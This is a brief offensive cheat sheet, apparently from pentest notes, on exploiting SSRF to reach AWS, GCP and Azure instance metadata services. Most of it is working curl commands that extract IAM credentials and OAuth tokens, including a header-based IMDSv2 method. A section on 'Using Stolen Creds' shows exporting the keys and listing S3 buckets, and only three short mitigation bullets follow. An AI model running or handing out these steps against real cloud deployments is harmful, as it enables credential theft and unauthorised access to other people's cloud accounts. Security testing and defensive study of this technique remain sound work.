# SSRF to Cloud Metadata Service (169.254.169.254)

Exploiting SSRF to extract cloud IAM credentials from instance metadata.

## AWS Metadata (IMDSv1)

```bash
# Get instance role credentials via SSRF
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Response contains AccessKeyId, SecretAccessKey, Token.

## IMDSv2 Bypass

IMDSv2 requires a token. If the SSRF allows headers:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

## GCP Metadata

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Azure Metadata

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Using Stolen Creds

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

## Mitigation

- Enforce IMDSv2 (requires token header)
- Block 169.254.169.254 at the application layer
- Use SSRF allowlists for outbound requests
